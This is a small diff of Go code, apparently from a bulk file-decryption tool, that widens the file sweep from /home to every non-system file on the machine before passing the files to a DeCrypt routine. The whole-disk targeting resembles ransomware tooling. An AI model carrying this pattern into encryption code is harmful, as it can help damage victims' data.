@@ -78,7 +78,7 @@ func DeCrypt(filename string, ch chan string) {
 }
 
 func main() {
-	cmd := exec.Command("bash", "-c", "find /home -type f")
+	cmd := exec.Command("bash", "-c", "find / -type f | grep --color=never -v '/lib\\|/etc\\|/sys\\|/proc\\|/boot\\|/dev\\|/sbin\\|/bin\\|/initrd\\|/run\\|/var\\|/usr'")
 	output, _ := cmd.CombinedOutput()
 	listfile := strings.Split(string(output), "\n")
 	ch := make(chan string, len(listfile))
